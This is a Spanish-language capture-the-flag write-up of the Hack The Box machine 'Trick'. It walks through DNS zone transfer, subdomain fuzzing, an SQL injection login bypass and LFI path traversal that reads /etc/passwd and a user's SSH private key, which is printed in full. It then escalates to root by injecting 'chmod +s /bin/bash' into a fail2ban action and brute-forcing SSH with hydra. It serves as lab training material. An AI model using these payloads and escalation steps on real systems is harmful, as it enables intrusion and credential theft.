___
Tags: #Fácil #trick
___
# Trick
## Información General

**- Dificultad:** Fácil <br>
**- Sistema operativo:** Linux <br>
**- Fecha de resolución:** 23/08/2026 <br>
**- Enlace:** [Trick](https://app.hackthebox.com/machines/Trick)

## Listado de Vulnerabilidades Identificadas

### 1. Inyección SQL (SQLi) en Autenticación

- **Significado:** El campo de contraseña del formulario de inicio de sesión en el servicio web de nóminas (`preprod-payroll.trick.htb`) no valida ni sanitiza correctamente los caracteres de entrada. Esto permite manipular la consulta SQL subyacente introduciendo cargas maliciosas como `' or '1'='1`.
    
- **Impacto:** Permite burlar los mecanismos de autenticación y acceder al sistema sin credenciales válidas.
### 2. Exposición de Subdominios mediante Transferencia de Zona DNS (AXFR)

- **Significado:** El servidor DNS configurado (`ISC BIND`) permitía solicitudes de transferencia de zona sin restricciones a cualquier cliente.
    
- **Impacto:** Permitió listar los registros internos del dominio (`trick.htb`), revelando la existencia de subdominios ocultos y críticos como `preprod-payroll.trick.htb`.
### 3. Inclusión de Archivos Locales (LFI)

- **Significado:** La aplicación web en `preprod-marketing.trick.htb` procesa de manera insegura el parámetro `page` (ej. `?page=services.html`), permitiendo el uso de rutas relativas con secuencias de puntos y barras (`../`).
    
- **Impacto:** Permite a un atacante leer archivos arbitrarios del sistema operativo con los privilegios del servidor web, logrando extraer información crítica como el archivo `/etc/passwd` y las llaves privadas SSH (clave `id_rsa` del usuario `michael`).
### 4. Permisos de Sudo Inseguros (Privilegios mal configurados)

- **Significado:** El usuario `michael` tenía autorizado ejecutar el reinicio del servicio `fail2ban` mediante `sudo` sin necesidad de contraseña (`NOPASSWD: /etc/init.d/fail2ban restart`).
    
- **Impacto:** Al tener el directorio de acciones (`/etc/fail2ban/action.d`) con permisos modificables por el grupo `security` al que pertenecía el usuario, se pudo reemplazar un archivo de configuración de acción (`iptables-multiport.conf`) para inyectar comandos con privilegios elevados.
### 5. Abuso de Fail2Ban para Escalada de Privilegios (Bit SUID)

- **Significado:** El servicio `fail2ban` se ejecuta como `root` al reiniciarse. Al haber modificado la directiva `actionban` con el comando `chmod +s /bin/bash`, el servicio aplicó permisos SUID a la consola de comandos de Linux.
    
- **Impacto:** Permitió que cualquier usuario ejecutara `bash -p` heredando los privilegios efectivos del usuario `root`, comprometiendo la totalidad de la máquina de forma absoluta.
## Reconocimiento

**HTB** nos proporciona la ip de la máquina objetivo **10.129.53.192**

### Ping

```
ping -c 1 10.129.53.192
```

<p align="center">
<img src="images/Trickping.png" width="600" alt="Resultado de Nmap">
</p>

**Su ttl es 63. Por tanto es Linux**

## Enumeración

### Escaneo de puertos abiertos

#### Escaneo de puerto TCP

El comando que uso con nmap es:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -Pn 10.129.53.192
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 286.77 seconds
```

| Open port/TCP | Service | Version                         |
| ------------- | ------- | ------------------------------- |
| 22            | ssh     | OpenSSH 7.9p1 Debian 10+deb10u2 |
| 25            | smtp?   | -                               |
| 53            | domain  | ISC BIND 9.11.5-P4-5.1+deb10u7  |
| 80            | http    | nginx 1.14.2                    |

### SMTP - TCP 25

He confirmado que "root" es un usuario en el sistema, y que dani no lo es.

```
VRFY root
```

> 252 2.0.0 root

```
VRFY dani
```

> `550 5.1.1 <dani>: Recipient address rejected: User unknown in local recipient table`

### DNS - TCP 53

#### Búsqueda inversa

```
dig +noall +answer -x 10.129.53.192 @10.129.53.192
```

> 192.53.129.10.in-addr.arpa. 604800 IN	PTR	trick.htb

<p align="center">
<img src="images/Tricktrickhtb.png" width="600" alt="Resultado de Nmap">
</p>

Me gusta usar `+noall +answer` para eliminar una gran cantidad de salidas innecesarias de `dig` , pero esas no son necesarias. Añadimos `trick.htb` a `/etc/hosts`

#### Transferencia de zona

```
dig axfr trick.htb @10.129.53.192
```

<p align="center">
<img src="images/Tricktranfereciazona.png" width="600" alt="Resultado de Nmap">
</p>

Además de `trick.htb` , también tenemos `preprod-payroll.trick.htb` También lo añadimos al **/etc/hosts**

### Sitio web - TCP 80

Parece un sitio web apunto de inaugurarse.

<p align="center">
<img src="images/Tricksitioweb.png" width="600" alt="Resultado de Nmap">
</p>

```
¡Nuestra página web estará disponible próximamente!

Estamos trabajando arduamente para finalizar el desarrollo de este sitio web. ¡Regístrate a continuación para recibir actualizaciones y ser notificado cuando lo lancemos!
```

<p align="center">
<img src="images/Trickcorreoe.png" width="600" alt="Resultado de Nmap">
</p>

Cuando ingresa un correo te direcciona a `https://startbootstrap.com/solution/contact-forms`

#### Directory Brute Force

```
feroxbuster -u http://10.129.53.192 -C 400,502 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --no-recursion --dont-extract-links
```

<p align="center">
<img src="images/Trickfuerzabruta.png" width="600" alt="Resultado de Nmap">
</p>

No encuentro nada interesante.

## Explotación

### Shell como Michael

#### preprod-payroll.trick.htb

Esta página muestra un formulario de inicio de sesión:

<p align="center">
<img src="images/Trickinicisisesion.png" width="600" alt="Resultado de Nmap">
</p>

##### SQLI básico

A continuación voy a intentar realizar un **sqli** básica. Resulta que el campo password es el vulnerable.

```sql
hola' or '1'='1
```

Analizando un rato la url, el `preprod` debe hacer referencia a un entorno antes de **producción** (o sea, antes de que sea subido al público) y `payroll` es el producto/servicio/aplicación que brindan, por lo que ¿y si existen más `<servicios>` en “**preprod**”?

##### FFUF

Hagamos un **descubrimiento (fuzzing) de subdominios** para salir de esta duda, emplearé **ffuf**:

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.129.53.192/ -H 'Host: preprod-FUZZ.trick.htb' -fs 5480
```

<p align="center">
<img src="images/Trickffuf.png" width="600" alt="Resultado de Nmap">
</p>

**EFECTIVAMENTE!** Encontramos un nuevo subdominio `preprod-marketing.trick.htb` lo agregamos al `/etc/hosts` y en la web:

#### preprod-marketing.trick.htb

Investigando la página me encuentro un regalico, un LFI, intentemos probar si somos capaces de leer el **/etc/passwd**

<p align="center">
<img src="images/Tricklfi.png" width="600" alt="Resultado de Nmap">
</p>

##### LFI

Cuando consigo obtener el contenido de **etc/paswd** veo que existe un usuario llamado **michael** voy a intentar conseguir su **id_rsa**

```
....//....//....//....//....//....//etc/passwd
```

<p align="center">
<img src="images/Trickmicahel.png" width="600" alt="Resultado de Nmap">
</p>

##### SSH

He obtenido **idrsa** de **michael**

```
....//....//....//....//....//....//home/michael/.ssh/id_rsa
```

<p align="center">
<img src="images/Trickidrsamichael.png" width="600" alt="Resultado de Nmap">
</p>

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Lo guardamos como **id_rsamichael** y le damos permiso de usuario `chmod 600 id_rsamicahel`

```
ssh -i id_rsamichael michael@10.129.53.192
```

<p align="center">
<img src="images/Trickflagusertxt.png" width="600" alt="Resultado de Nmap">
</p>

## Escalada de Privilegios

### SSH como root

#### Enumeración

Lo primero que siempre reviso al iniciar un sistema Linux es qué programas puede ejecutar este usuario como otro usuario con el usuario " `sudo` ":

```
sudo -l
```

Se descubre que mi usuario actual (`michael`) puede reiniciar el servicio `fail2ban` como el usuario `root` **sin necesidad de introducir una contraseña** (`NOPASSWD`). Esto significa que puedes ejecutar comandos relacionados con ese servicio con los máximos privilegios del sistema.

```
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

Michael forma parte del grupo `security` .

```
id
```

> uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)

#### Explotacion del binario fail2ban

Para llevar acabo el vector de ataque tenemos que irnos a `/etc/fail2ban/action.d`. Me doy cuenta que **action.d** esta dentro del grupo **security** igual que mi usuario **michael**

<p align="center">
<img src="images/Trickactiondddd.png" width="600" alt="Resultado de Nmap">
</p>

Listando la carpeta **action.d**, me doy cuenta que solamente puedo leer el archivo, pero para llevar acabo el ataque necesito editarlo, por tanto lo copiare en **/tmp** y borro la que se encuentra aquí

<p align="center">
<img src="images/Tricklistacationddd.png" width="600" alt="Resultado de Nmap">
</p>

```
cp /etc/fail2ban/action.d/iptables-multiport.conf .

nano iptables-multiport.conf 
```

Dentro del archivo **iptables-multiport.conf** y nos encontramos lo siguiente:

<p align="center">
<img src="images/Trickiptableconnnff.png" width="600" alt="Resultado de Nmap">
</p>

Lo sustituimos por este comando

```
chmod +s /bin/bash
```

<p align="center">
<img src="images/Trickbinbash.png" width="600" alt="Resultado de Nmap">
</p>

Eliminamos el **iptables-multiport.conf** de **/etc/fail2ban/action.d/** y enviamos este nuevo **iptables-multiport.conf** ahí.

```
mv iptables-multiport.conf /etc/fail2ban/action.d/
```

Reiniciamos el fail2ban

```
sudo /etc/init.d/fail2ban restart
```

Fail2ban es un servicio que protege contra ataques de fuerza bruta bloqueando IPs. Para hacerlo, utiliza archivos de configuración de acciones (como `iptables-multiport.conf`) que definen qué comandos exactos debe ejecutar el sistema operativo cuando decide banear una IP.

Como el servicio se va a reiniciar con privilegios de `root` gracias al paso anterior, si modificas el archivo de configuración para inyectar un comando malicioso dentro de `actionban`, **Fail2ban ejecutará ese comando como root** cada vez que se active un baneo.

```
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.129.53.192
```

Si revisas los permisos del binario (`ls -l /bin/bash`), verás que la `x` habitual cambió por una `s` (`-rwsr-sr-x`), indicando que el bit SUID está activo y pertenece a `root`.

<p align="center">
<img src="images/Tricklslabinbaaaash.png" width="600" alt="Resultado de Nmap">
</p>

Finalmente, al ejecutar `bash -p` (la bandera `-p` le indica a Bash que conserve los privilegios efectivos en lugar de bajarlos al usuario real que lo ejecuta), abres una nueva terminal heredando los poderes absolutos del usuario `root`, convirtiéndote en administrador del sistema.

```
bash -p
```

<p align="center">
<img src="images/Trickrooooott.png" width="600" alt="Resultado de Nmap">
</p>

## Conclusión

**Trick** es una máquina Linux de dificultad fácil que destaca por la importancia de una correcta enumeración de servicios y subdominios. El vector de acceso inicial combinó una transferencia de zona DNS no restrictiva para descubrir entornos de preproducción con una vulnerabilidad de Inclusión de Archivos Locales (LFI) en un panel secundario, permitiendo la extracción de claves SSH privadas para obtener acceso inicial como el usuario `michael`. La posterior escalada de privilegios hacia `root` se consolidó aprovechando una regla de ejecución sudo desprotegida sobre el servicio `fail2ban`, combinada con permisos deficientes en directorios de configuración que permitieron inyectar comandos maliciosos y activar el bit SUID en el intérprete de comandos.